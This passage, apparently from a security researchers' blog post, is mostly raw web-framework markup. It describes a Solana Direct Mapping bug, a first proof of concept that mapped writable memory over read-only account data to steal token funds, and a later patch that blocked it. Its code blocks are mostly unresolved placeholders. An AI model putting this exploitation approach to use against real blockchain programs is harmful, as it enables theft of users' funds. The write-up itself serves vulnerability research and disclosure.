text-glow\",\"children\":\"A Failed Exploit that Led Us Deeper\"}]\na9:[\"$\",\"p\",\"p-100\",{\"className\":\"text-lg sm:text-xl mb-4 text-pretty sm:text-justify text-white/70 leading-relaxed\",\"children\":\"Though the primitive seems extremely powerful, the exploitation wasn't as smooth as it might seems. After identifying the critical oversight, we started assessing its impact.\"}]\naa:[\"$\",\"p\",\"p-101\",{\"className\":\"text-lg sm:text-xl mb-4 text-pretty sm:text-justify text-white/70 leading-relaxed\",\"children\":\"Our first intuition is that since virtual memory are mapped incorrectly, it should be possible to bypass the memory write authorization checks, for exmaple, by mapping a writable virtual memory to some account data that should be readonly. This will be sufficient to allow attackers to steal funds by modifying token program accounts. Our first PoC implemented this idea, and it worked on an older version of Direct Mapping.\"}]\n"])</script><script>self.__next_f.push([1,"ab:[\"$\",\"pre\",\"pre-13\",{\"children\":[\"$\",\"div\",\"code-0\",{\"className\":\"relative my-6 border border-white/10 bg-black/60\",\"children\":[[\"$\",\"div\",null,{\"className\":\"absolute -top-3 left-4 px-2 bg-[#050505] text-xs tracking-[0.2em] text-white/40 font-mono uppercase\",\"children\":[\":: \",\"RUST\"]}],[\"$\",\"div\",null,{\"className\":\"rounded-sm !bg-transparent !m-0\",\"style\":{\"color\":\"#ccc\",\"background\":\"#0a0a0a\",\"fontFamily\":\"Consolas, Monaco, 'Andale Mono', 'Ubuntu Mono', monospace\",\"fontSize\":\"1em\",\"textAlign\":\"left\",\"whiteSpace\":\"pre\",\"wordSpacing\":\"normal\",\"wordBreak\":\"normal\",\"wordWrap\":\"normal\",\"lineHeight\":\"1.5\",\"MozTabSize\":\"4\",\"OTabSize\":\"4\",\"tabSize\":\"4\",\"WebkitHyphens\":\"none\",\"MozHyphens\":\"none\",\"msHyphens\":\"none\",\"hyphens\":\"none\",\"padding\":\"1em\",\"margin\":\".5em 0\",\"overflow\":\"auto\",\"border\":\"1px solid rgba(255, 255, 255, 0.15)\",\"boxShadow\":\"0 0 20px rgba(255, 255, 255, 0.03), inset 0 0 30px rgba(0, 0, 0, 0.5)\"},\"children\":[\"$\",\"code\",null,{\"className\":\"language-rust\",\"style\":{\"whiteSpace\":\"pre\",\"color\":\"#e0e0e0\",\"background\":\"none\",\"fontFamily\":\"Consolas, Monaco, 'Andale Mono', 'Ubuntu Mono', monospace\",\"fontSize\":\"1em\",\"textAlign\":\"left\",\"wordSpacing\":\"normal\",\"wordBreak\":\"normal\",\"wordWrap\":\"normal\",\"lineHeight\":\"1.5\",\"MozTabSize\":\"4\",\"OTabSize\":\"4\",\"tabSize\":\"4\",\"WebkitHyphens\":\"none\",\"MozHyphens\":\"none\",\"msHyphens\":\"none\",\"hyphens\":\"none\"},\"children\":[false,[[\"$\",\"span\",\"line-number--1\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[1]}],[\"$\",\"span\",\"code-segment-1\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"use\"]}],[\"$\",\"span\",\"code-segment-2\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segment-3\",{\"className\":\"token token\",\"style\":{\"color\":\"#e2777a\"},\"children\":[\"std\"]}],[\"$\",\"span\",\"code-segment-4\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"::\"]}],[\"$\",\"span\",\"code-segment-5\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"{\"]}],[\"$\",\"span\",\"code-segment-6\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--2\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[2]}],[\"$\",\"span\",\"code-segment-8\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"    ptr\"]}],[\"$\",\"span\",\"code-segment-9\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}],[\"$\",\"span\",\"code-segment-10\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--3\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[3]}],[\"$\",\"span\",\"code-segment-12\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"    mem\"]}],[\"$\",\"span\",\"code-segment-13\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}],[\"$\",\"span\",\"code-segment-14\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--4\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[4]}],[\"$\",\"span\",\"code-segment-16\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"    \"]}],[\"$\",\"span\",\"code-segment-17\",{\"className\":\"token token\",\"style\":{\"color\":\"#e2777a\"},\"children\":[\"rc\"]}],[\"$\",\"span\",\"code-segment-18\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"::\"]}],[\"$\",\"span\",\"code-segment-19\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"Rc\"]}],[\"$\",\"span\",\"code-segment-20\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}],[\"$\",\"span\",\"code-segment-21\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--5\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[5]}],\"$L9b5\",\"$L9b6\",\"$L9b7\",\"$L9b8\",\"$L9b9\",\"$L9ba\",\"$L9bb\",\"$L9bc\",\"$L9bd\",\"$L9be\",\"$L9bf\",\"$L9c0\",\"$L9c1\",\"$L9c2\",\"$L9c3\",\"$L9c4\",\"$L9c5\",\"$L9c6\",\"$L9c7\",\"$L9c8\",\"$L9c9\",\"$L9ca\",\"$L9cb\",\"$L9cc\",\"$L9cd\",\"$L9ce\",\"$L9cf\",\"$L9d0\",\"$L9d1\",\"$L9d2\",\"$L9d3\",\"$L9d4\",\"$L9d5\",\"$L9d6\",\"$L9d7\",\"$L9d8\",\"$L9d9\",\"$L9da\",\"$L9db\",\"$L9dc\",\"$L9dd\",\"$L9de\",\"$L9df\",\"$L9e0\",\"$L9e1\",\"$L9e2\",\"$L9e3\",\"$L9e4\",\"$L9e5\",\"$L9e6\",\"$L9e7\",\"$L9e8\",\"$L9e9\",\"$L9ea\",\"$L9eb\",\"$L9ec\",\"$L9ed\",\"$L9ee\",\"$L9ef\",\"$L9f0\",\"$L9f1\",\"$L9f2\",\"$L9f3\",\"$L9f4\",\"$L9f5\",\"$L9f6\",\"$L9f7\",\"$L9f8\",\"$L9f9\",\"$L9fa\",\"$L9fb\",\"$L9fc\",\"$L9fd\",\"$L9fe\",\"$L9ff\",\"$La00\",\"$La01\",\"$La02\",\"$La03\",\"$La04\",\"$La05\",\"$La06\",\"$La07\",\"$La08\",\"$La09\",\"$La0a\",\"$La0b\",\"$La0c\",\"\\n\",\"$La0d\",\"$La0e\",\"$La0f\",\"$La10\",\"$La11\",\"$La12\",\"$La13\",\"$La14\",\"$La15\",\"\\n\",\"$La16\",\"\\n\",\"$La17\",\"$La18\",\"$La19\",\"$La1a\",\"$La1b\",\"$La1c\",\"$La1d\",\"$La1e\",\"$La1f\",\"$La20\",\"$La21\",\"$La22\",\"$La23\",\"$La24\",\"$La25\",\"$La26\",\"$La27\",\"$La28\",\"$La29\",\"$La2a\",\"$La2b\",\"$La2c\",\"$La2d\",\"$La2e\",\"$La2f\",\"$La30\",\"$La31\",\"$La32\",\"$La33\",\"$La34\",\"$La35\",\"$La36\",\"$La37\",\"$La38\",\"$La39\",\"$La3a\",\"$La3b\",\"$La3c\",\"$La3d\",\"$La3e\",\"$La3f\",\"$La40\",\"$La41\",\"$La42\",\"$La43\",\"$La44\",\"$La45\",\"$La46\",\"$La47\",\"$La48\",\"$La49\",\"$La4a\",\"$La4b\",\"$La4c\",\"$La4d\",\"$La4e\",\"$La4f\",\"$La50\",\"$La51\",\"$La52\",\"\\n\",\"$La53\",\"$La54\",\"$La55\",\"$La56\",\"$La57\",\"$La58\",\"$La59\",\"$La5a\",\"$La5b\",\"$La5c\",\"$La5d\",\"$La5e\",\"$La5f\",\"$La60\",\"$La61\",\"$La62\",\"$La63\",\"$La64\",\"$La65\",\"$La66\",\"$La67\",\"$La68\",\"$La69\",\"$La6a\",\"$La6b\",\"\\n\",\"$La6c\",\"$La6d\",\"$La6e\",\"$La6f\",\"$La70\",\"$La71\",\"$La72\",\"$La73\",\"$La74\",\"$La75\",\"$La76\",\"$La77\",\"$La78\",\"$La79\",\"$La7a\",\"$La7b\",\"$La7c\",\"$La7d\",\"$La7e\",\"$La7f\",\"$La80\",\"$La81\",\"$La82\",\"$La83\",\"$La84\",\"$La85\",\"$La86\",\"$La87\",\"$La88\",\"$La89\",\"$La8a\",\"$La8b\",\"$La8c\",\"$La8d\",\"$La8e\",\"$La8f\",\"$La90\",\"$La91\",\"$La92\",\"$La93\",\"$La94\",\"$La95\",\"$La96\",\"$La97\",\"$La98\",\"$La99\",\"$La9a\",\"$La9b\",\"$La9c\",\"$La9d\",\"$La9e\",\"$La9f\",\"$Laa0\",\"$Laa1\",\"$Laa2\",\"$Laa3\",\"$Laa4\",\"$Laa5\",\"$Laa6\",\"$Laa7\",\"$Laa8\",\"$Laa9\",\"$Laaa\",\"$Laab\",\"$Laac\",\"$Laad\",\"$Laae\",\"$Laaf\",\"$Lab0\",\"$Lab1\",\"$Lab2\",\"$Lab3\",\"$Lab4\",\"$Lab5\",\"$Lab6\",\"$Lab7\",\"$Lab8\",\"$Lab9\",\"$Laba\",\"$Labb\",\"$Labc\",\"$Labd\",\"$Labe\",\"$Labf\",\"$Lac0\",\"$Lac1\",\"$Lac2\",\"$Lac3\",\"$Lac4\",\"$Lac5\",\"$Lac6\",\"$Lac7\",\"$Lac8\",\"$Lac9\",\"$Laca\",\"$Lacb\",\"$Lacc\",\"$Lacd\",\"$Lace\",\"$Lacf\",\"$Lad0\",\"$Lad1\",\"$Lad2\",\"$Lad3\",\"$Lad4\",\"$Lad5\",\"$Lad6\",\"$Lad7\",\"$Lad8\",\"$Lad9\",\"$Lada\",\"$Ladb\",\"$Ladc\",\"$Ladd\",\"$Lade\",\"$Ladf\",\"$Lae0\",\"$Lae1\",\"$Lae2\",\"$Lae3\",\"$Lae4\",\"$Lae5\",\"$Lae6\",\"$Lae7\",\"$Lae8\",\"$Lae9\",\"$Laea\",\"$Laeb\",\"$Laec\",\"$Laed\",\"$Laee\",\"$Laef\",\"$Laf0\",\"$Laf1\",\"$Laf2\",\"$Laf3\",\"$Laf4\",\"$Laf5\",\"$Laf6\",\"$Laf7\",\"$Laf8\",\"$Laf9\",\"$Lafa\",\"$Lafb\",\"$Lafc\",\"$Lafd\",\"$Lafe\",\"$Laff\",\"$Lb00\",\"$Lb01\",\"$Lb02\",\"$Lb03\",\"$Lb04\",\"$Lb05\",\"$Lb06\",\"$Lb07\",\"$Lb08\",\"$Lb09\",\"$Lb0a\",\"$Lb0b\",\"$Lb0c\",\"$Lb0d\",\"$Lb0e\",\"$Lb0f\",\"$Lb10\",\"$Lb11\",\"$Lb12\",\"$Lb13\",\"$Lb14\",\"$Lb15\",\"$Lb16\",\"$Lb17\",\"$Lb18\",\"$Lb19\",\"$Lb1a\",\"$Lb1b\",\"$Lb1c\",\"$Lb1d\",\"$Lb1e\",\"$Lb1f\",\"$Lb20\",\"$Lb21\",\"$Lb22\",\"$Lb23\",\"$Lb24\",\"$Lb25\",\"$Lb26\",\"$Lb27\",\"$Lb28\",\"$Lb29\",\"$Lb2a\",\"$Lb2b\",\"$Lb2c\",\"$Lb2d\",\"$Lb2e\",\"$Lb2f\",\"$Lb30\",\"$Lb31\",\"$Lb32\",\"$Lb33\",\"$Lb34\",\"$Lb35\",\"$Lb36\",\"$Lb37\",\"$Lb38\",\"$Lb39\",\"$Lb3a\",\"$Lb3b\",\"$Lb3c\",\"$Lb3d\",\"$Lb3e\",\"$Lb3f\",\"$Lb40\",\"$Lb41\",\"$Lb42\",\"$Lb43\",\"$Lb44\",\"$Lb45\",\"$Lb46\",\"$Lb47\",\"$Lb48\",\"$Lb49\",\"$Lb4a\",\"$Lb4b\",\"$Lb4c\",\"$Lb4d\",\"$Lb4e\",\"$Lb4f\",\"$Lb50\",\"$Lb51\",\"$Lb52\",\"$Lb53\",\"$Lb54\",\"$Lb55\",\"$Lb56\",\"$Lb57\",\"$Lb58\",\"$Lb59\",\"$Lb5a\",\"$Lb5b\",\"$Lb5c\",\"$Lb5d\",\"$Lb5e\",\"$Lb5f\",\"$Lb60\",\"$Lb61\",\"$Lb62\",\"$Lb63\",\"\\n\",\"$Lb64\",\"$Lb65\",\"$Lb66\",\"$Lb67\",\"$Lb68\",\"$Lb69\",\"$Lb6a\",\"$Lb6b\",\"$Lb6c\",\"$Lb6d\",\"$Lb6e\",\"$Lb6f\",\"$Lb70\",\"$Lb71\",\"$Lb72\",\"$Lb73\",\"$Lb74\",\"$Lb75\",\"$Lb76\",\"$Lb77\",\"$Lb78\",\"$Lb79\",\"$Lb7a\",\"$Lb7b\",\"$Lb7c\",\"$Lb7d\",\"$Lb7e\",\"$Lb7f\",\"$Lb80\",\"$Lb81\",\"$Lb82\",\"$Lb83\",\"$Lb84\",\"$Lb85\",\"$Lb86\"]]}]}]]}]}]\n"])</script><script>self.__next_f.push([1,"ac:[\"$\",\"p\",\"p-102\",{\"className\":\"text-lg sm:text-xl mb-4 text-pretty sm:text-justify text-white/70 leading-relaxed\",\"children\":\"However, once we pulled the latest code, our PoC stopped working. How so?\"}]\nad:[\"$\",\"p\",\"p-103\",{\"className\":\"text-lg sm:text-xl mb-4 text-pretty sm:text-justify text-white/70 leading-relaxed\",\"children\":\"Coincidentally, Solana was actively patching another bug while we were developing our PoC. We originally thought the patch was irrelevant to our bug, but it ended up blocking our first exploit.\"}]\n"])</script><script>self.__next_f.push([1,"ae:[\"$\",\"p\",\"p-104\",{\"className\":\"text-lg sm:text-xl mb-4 text-pretty sm:text-justify text-white/70 leading-relaxed\",\"children\":[\"The patch addresses a mistake where \",[\"$\",\"code\",\"code-0\",{\"className\":\"whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono\",\"style\":{\"background\":\"rgba(255, 255, 255, 0.1)\",\"fontSize\":\"0.9em\"},\"children\":\"MemoryRegion\"}],\" states are not updated properly across CPIs. That fix landed in \",[\"$\",\"a\",\"a-0\",{\"className\":\"text-white hover:text-glow transition-all duration-300 underline underline-offset-4 decoration-white/30 hover:decoration-white\",\"target\":\"_blank\",\"rel\":\"noopener noreferrer\",\"href\":\"https://github.com/solana-labs/solana/pull/32649/commits/9788a4efffdb1436bdcb5f0891111398d5a4da0b\",\"children\":\"this commit\"}],\". The main addition of the patch is shown below.\"]}]\n"])</script><script>self.__next_f.push([1,"af:[\"$\",\"pre\",\"pre-14\",{\"children\":[\"$\",\"div\",\"code-0\",{\"className\":\"relative my-6 border border-white/10 bg-black/60\",\"children\":[[\"$\",\"div\",null,{\"className\":\"absolute -top-3 left-4 px-2 bg-[#050505] text-xs tracking-[0.2em] text-white/40 font-mono uppercase\",\"children\":[\":: \",\"RUST\"]}],[\"$\",\"div\",null,{\"className\":\"rounded-sm !bg-transparent !m-0\",\"style\":{\"color\":\"#ccc\",\"background\":\"#0a0a0a\",\"fontFamily\":\"Consolas, Monaco, 'Andale Mono', 'Ubuntu Mono', monospace\",\"fontSize\":\"1em\",\"textAlign\":\"left\",\"whiteSpace\":\"pre\",\"wordSpacing\":\"normal\",\"wordBreak\":\"normal\",\"wordWrap\":\"normal\",\"lineHeight\":\"1.5\",\"MozTabSize\":\"4\",\"OTabSize\":\"4\",\"tabSize\":\"4\",\"WebkitHyphens\":\"none\",\"MozHyphens\":\"none\",\"msHyphens\":\"none\",\"hyphens\":\"none\",\"padding\":\"1em\",\"margin\":\".5em 0\",\"overflow\":\"auto\",\"border\":\"1px solid rgba(255, 255, 255, 0.15)\",\"boxShadow\":\"0 0 20px rgba(255, 255, 255, 0.03), inset 0 0 30px rgba(0, 0, 0, 0.5)\"},\"children\":[\"$\",\"code\",null,{\"className\":\"language-rust\",\"style\":{\"whiteSpace\":\"pre\",\"color\":\"#e0e0e0\",\"background\":\"none\",\"fontFamily\":\"Consolas, Monaco, 'Andale Mono', 'Ubuntu Mono', monospace\",\"fontSize\":\"1em\",\"textAlign\":\"left\",\"wordSpacing\":\"normal\",\"wordBreak\":\"normal\",\"wordWrap\":\"normal\",\"lineHeight\":\"1.5\",\"MozTabSize\":\"4\",\"OTabSize\":\"4\",\"tabSize\":\"4\",\"WebkitHyphens\":\"none\",\"MozHyphens\":\"none\",\"msHyphens\":\"none\",\"hyphens\":\"none\"},\"children\":[false,[[\"$\",\"span\",\"line-number--1\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[1]}],[\"$\",\"span\",\"code-segment-1\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"fn\"]}],[\"$\",\"span\",\"code-segment-2\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segment-3\",{\"className\":\"token token function-definition\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"update_caller_account_perms\"]}],[\"$\",\"span\",\"code-segment-4\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}],[\"$\",\"span\",\"code-segment-5\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--2\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[2]}],[\"$\",\"span\",\"code-segment-7\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"    memory_mapping\"]}],[\"$\",\"span\",\"code-segment-8\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\":\"]}],[\"$\",\"span\",\"code-segment-9\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segment-10\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u0026\"]}],[\"$\",\"span\",\"code-segment-11\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"MemoryMapping\"]}],[\"$\",\"span\",\"code-segment-12\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}],[\"$\",\"span\",\"code-segment-13\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--3\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[3]}],[\"$\",\"span\",\"code-segment-15\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"    caller_account\"]}],[\"$\",\"span\",\"code-segment-16\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\":\"]}],[\"$\",\"span\",\"code-segment-17\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segment-18\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u0026\"]}],[\"$\",\"span\",\"code-segment-19\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"CallerAccount\"]}],[\"$\",\"span\",\"code-segment-20\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}],[\"$\",\"span\",\"code-segment-21\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--4\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[4]}],\"$Lb87\",\"$Lb88\",\"$Lb89\",\"$Lb8a\",\"$Lb8b\",\"$Lb8c\",\"$Lb8d\",\"$Lb8e\",\"$Lb8f\",\"$Lb90\",\"$Lb91\",\"$Lb92\",\"$Lb93\",\"$Lb94\",\"$Lb95\",\"$Lb96\",\"$Lb97\",\"$Lb98\",\"$Lb99\",\"$Lb9a\",\"$Lb9b\",\"$Lb9c\",\"$Lb9d\",\"$Lb9e\",\"$Lb9f\",\"$Lba0\",\"$Lba1\",\"$Lba2\",\"$Lba3\",\"$Lba4\",\"$Lba5\",\"$Lba6\",\"$Lba7\",\"$Lba8\",\"$Lba9\",\"$Lbaa\",\"$Lbab\",\"$Lbac\",\"$Lbad\",\"$Lbae\",\"$Lbaf\",\"$Lbb0\",\"$Lbb1\",\"$Lbb2\",\"$Lbb3\",\"$Lbb4\",\"$Lbb5\",\"$Lbb6\",\"$Lbb7\",\"$Lbb8\",\"$Lbb9\",\"$Lbba\",\"$Lbbb\",\"$Lbbc\",\"$Lbbd\",\"$Lbbe\",\"$Lbbf\",\"$Lbc0\",\"$Lbc1\",\"$Lbc2\",\"$Lbc3\",\"$Lbc4\",\"$Lbc5\",\"\\n\",\"$Lbc6\",\"$Lbc7\",\"$Lbc8\",\"$Lbc9\",\"$Lbca\",\"$Lbcb\",\"$Lbcc\",\"$Lbcd\",\"$Lbce\",\"$Lbcf\",\"$Lbd0\",\"$Lbd1\",\"$Lbd2\",\"$Lbd3\",\"$Lbd4\",\"$Lbd5\",\"$Lbd6\",\"$Lbd7\",\"$Lbd8\",\"$Lbd9\",\"$Lbda\",\"$Lbdb\",\"$Lbdc\",\"$Lbdd\",\"$Lbde\",\"$Lbdf\",\"$Lbe0\",\"$Lbe1\",\"$Lbe2\",\"$Lbe3\",\"$Lbe4\",\"$Lbe5\",\"$Lbe6\",\"$Lbe7\",\"$Lbe8\",\"$Lbe9\",\"$Lbea\",\"$Lbeb\",\"$Lbec\",\"$Lbed\",\"$Lbee\",\"$Lbef\",\"$Lbf0\",\"$Lbf1\",\"$Lbf2\",\"$Lbf3\",\"$Lbf4\",\"$Lbf5\",\"$Lbf6\",\"$Lbf7\",\"$Lbf8\",\"$Lbf9\",\"$Lbfa\",\"$Lbfb\",\"$Lbfc\",\"$Lbfd\",\"$Lbfe\",\"$Lbff\",\"$Lc00\",\"$Lc01\",\"$Lc02\",\"$Lc03\",\"$Lc04\",\"$Lc05\",\"$Lc06\",\"$Lc07\",\"$Lc08\",\"$Lc09\",\"$Lc0a\",\"$Lc0b\",\"$Lc0c\",\"$Lc0d\",\"$Lc0e\",\"$Lc0f\",\"$Lc10\",\"$Lc11\",\"$Lc12\",\"$Lc13\",\"$Lc14\",\"$Lc15\",\"$Lc16\",\"$Lc17\",\"$Lc18\",\"$Lc19\",\"$Lc1a\",\"$Lc1b\",\"$Lc1c\",\"$Lc1d\",\"$Lc1e\",\"$Lc1f\",\"$Lc20\",\"$Lc21\",\"$Lc22\",\"$Lc23\",\"$Lc24\",\"$Lc25\",\"$Lc26\",\"$Lc27\",\"$Lc28\",\"$Lc29\",\"$Lc2a\",\"$Lc2b\",\"$Lc2c\",\"$Lc2d\",\"$Lc2e\",\"$Lc2f\",\"$Lc30\",\"$Lc31\",\"$Lc32\",\"$Lc33\",\"$Lc34\",\"$Lc35\",\"$Lc36\",\"$Lc37\",\"$Lc38\",\"$Lc39\",\"$Lc3a\",\"$Lc3b\",\"$Lc3c\",\"$Lc3d\",\"$Lc3e\",\"                    region\\n\",\"$Lc3f\",\"$Lc40\",\"$Lc41\",\"$Lc42\",\"$Lc43\",\"$Lc44\",\"$Lc45\",\"$Lc46\",\"$Lc47\",\"$Lc48\",\"$Lc49\",\"$Lc4a\",\"$Lc4b\",\"$Lc4c\",\"$Lc4d\",\"$Lc4e\",\"$Lc4f\",\"$Lc50\",\"$Lc51\",\"$Lc52\",\"$Lc53\",\"$Lc54\",\"$Lc55\",\"$Lc56\",\"$Lc57\",\"$Lc58\",\"$Lc59\",\"$Lc5a\",\"$Lc5b\",\"$Lc5c\",\"$Lc5d\",\"$Lc5e\",\"$Lc5f\",\"$Lc60\",\"$Lc61\",\"$Lc62\",\"$Lc63\",\"$Lc64\",\"$Lc65\",\"$Lc66\",\"$Lc67\",\"$Lc68\",\"$Lc69\",\"$Lc6a\",\"$Lc6b\",\"$Lc6c\",\"$Lc6d\",\"$Lc6e\",\"$Lc6f\",\"$Lc70\",\"$Lc71\",\"\\n\",\"$Lc72\",\"$Lc73\",\"$Lc74\",\"$Lc75\",\"$Lc76\",\"$Lc77\",\"$Lc78\",\"$Lc79\",\"$Lc7a\",\"$Lc7b\",\"$Lc7c\",\"$Lc7d\",\"$Lc7e\",\"$Lc7f\",\"$Lc80\",\"$Lc81\",\"$Lc82\",\"$Lc83\",\"$Lc84\",\"$Lc85\",\"$Lc86\",\"$Lc87\",\"$Lc88\",\"$Lc89\",\"$Lc8a\",\"$Lc8b\",\"$Lc8c\",\"$Lc8d\",\"$Lc8e\",\"$Lc8f\",\"$Lc90\",\"$Lc91\",\"$Lc92\",\"$Lc93\",\"$Lc94\",\"$Lc95\",\"$Lc96\",\"$Lc97\",\"$Lc98\",\"$Lc99\",\"$Lc9a\",\"$Lc9b\",\"$Lc9c\",\"$Lc9d\",\"$Lc9e\",\"$Lc9f\",\"$Lca0\",\"$Lca1\",\"$Lca2\",\"$Lca3\",\"$Lca4\",\"$Lca5\",\"$Lca6\",\"$Lca7\",\"$Lca8\",\"$Lca9\",\"$Lcaa\",\"$Lcab\",\"$Lcac\",\"$Lcad\",\"$Lcae\",\"$Lcaf\",\"$Lcb0\",\"$Lcb1\",\"$Lcb2\",\"$Lcb3\",\"$Lcb4\",\"$Lcb5\",\"$Lcb6\",\"$Lcb7\",\"$Lcb8\",\"$Lcb9\",\"$Lcba\",\"$Lcbb\",\"$Lcbc\",\"$Lcbd\",\"$Lcbe\",\"$Lcbf\",\"$Lcc0\",\"$Lcc1\",\"$Lcc2\",\"$Lcc3\",\"$Lcc4\",\"$Lcc5\",\"$Lcc6\",\"$Lcc7\",\"$Lcc8\",\"$Lcc9\",\"$Lcca\",\"$Lccb\",\"$Lccc\",\"$Lccd\",\"$Lcce\",\"$Lccf\",\"$Lcd0\",\"$Lcd1\",\"$Lcd2\",\"$Lcd3\",\"$Lcd4\",\"$Lcd5\",\"$Lcd6\",\"$Lcd7\",\"$Lcd8\",\"$Lcd9\",\"$Lcda\",\"$Lcdb\",\"$Lcdc\",\"        